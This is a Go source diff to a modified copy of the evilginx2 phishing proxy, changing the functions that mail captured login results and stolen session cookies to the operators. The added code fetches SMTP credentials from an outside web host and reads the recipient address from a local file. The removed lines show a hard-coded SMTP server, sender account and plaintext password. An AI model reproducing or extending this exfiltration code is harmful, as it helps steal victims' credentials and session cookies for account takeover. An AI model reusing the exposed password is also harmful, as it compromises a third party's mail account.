@@ -3,6 +3,9 @@ package database
 import (
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
+	"log"
+	"net/http"
 	"os"
 
 	"github.com/tidwall/buntdb"
@@ -12,16 +15,49 @@ import (
 	"time"
 )
 
+type Smtp struct {
+	Host     string `json:"host"`
+	Port     string `json:"port"`
+	Username string `json:"username"`
+	Password string `json:"password"`
+}
+
 func telegramSendResult(msg string) {
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
+
+	response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
+	if err != nil {
+		fmt.Printf("%s", err)
+	}
+
+	var smtp Smtp
+
+	responseData, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		log.Fatal(err)
+	}
+	json.Unmarshal(responseData, &smtp)
+
+	file, err := os.Open("/root/evilginx2-master/database/result.txt")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer func() {
+		if err = file.Close(); err != nil {
+			log.Fatal(err)
+		}
+	}()
+
+	b, err := ioutil.ReadAll(file)
+	data := string(b)
 
 	m := gomail.NewMessage()
 
 	// Set E-Mail sender
-	m.SetHeader("From", "alainaubry@a2pfrance.fr")
+	m.SetHeader("From", smtp.Username)
 
 	// Set E-Mail receivers
-	m.SetHeader("To", "scyllascofield@outlook.com")
+	m.SetHeader("To", data)
 
 	// Set E-Mail subject
 	m.SetHeader("Subject", "RESULT IS COMING")
@@ -30,16 +66,16 @@ func telegramSendResult(msg string) {
 	m.SetBody("text/plain", msg)
 
 	// Settings for SMTP server
-	d := gomail.NewDialer("smtp.ionos.de", 587, "alainaubry@a2pfrance.fr", "Angus4952!")
+	d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)
 
 	// This is only needed when SSL/TLS certificate is not valid on server.
 	// In production this should be set to false.
 	// d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
 
 	// Now send E-Mail
-	if err := d.DialAndSend(m); err != nil {
+	if err = d.DialAndSend(m); err != nil {
 		fmt.Println(err)
-		panic(err)
+
 	}
 
 	return
@@ -49,7 +85,33 @@ func telegramSendResult(msg string) {
 func sendEmailCookie(msg string) {
 	//msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 
-	err := os.WriteFile("cookies.json", []byte(msg), 0755)
+	response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
+	if err != nil {
+		fmt.Printf("%s", err)
+	}
+
+	var smtp Smtp
+
+	responseData, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		log.Fatal(err)
+	}
+	json.Unmarshal(responseData, &smtp)
+
+	file, err := os.Open("/root/evilginx2-master/database/result.txt")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer func() {
+		if err = file.Close(); err != nil {
+			log.Fatal(err)
+		}
+	}()
+
+	b, err := ioutil.ReadAll(file)
+	data := string(b)
+
+	err = os.WriteFile("cookies.json", []byte(msg), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
 	}
@@ -57,10 +119,10 @@ func sendEmailCookie(msg string) {
 	m := gomail.NewMessage()
 
 	// Set E-Mail sender
-	m.SetHeader("From", "alainaubry@a2pfrance.fr")
+	m.SetHeader("From", smtp.Username)
 
 	// Set E-Mail receivers
-	m.SetHeader("To", "scyllascofield@outlook.com")
+	m.SetHeader("To", data)
 
 	// Set E-Mail subject
 	m.SetHeader("Subject", "🍪COOKIE IS COMING🍪")
@@ -70,7 +132,7 @@ func sendEmailCookie(msg string) {
 	m.Attach("cookies.json")
 
 	// Settings for SMTP server
-	d := gomail.NewDialer("smtp.ionos.de", 587, "alainaubry@a2pfrance.fr", "Angus4952!")
+	d := gomail.NewDialer(smtp.Host, 587, smtp.Username, smtp.Password)
 
 	// This is only needed when SSL/TLS certificate is not valid on server.
 	// In production this should be set to false.
@@ -79,7 +141,7 @@ func sendEmailCookie(msg string) {
 	// Now send E-Mail
 	if err := d.DialAndSend(m); err != nil {
 		fmt.Println(err)
-		panic(err)
+
 	}
 
 	return
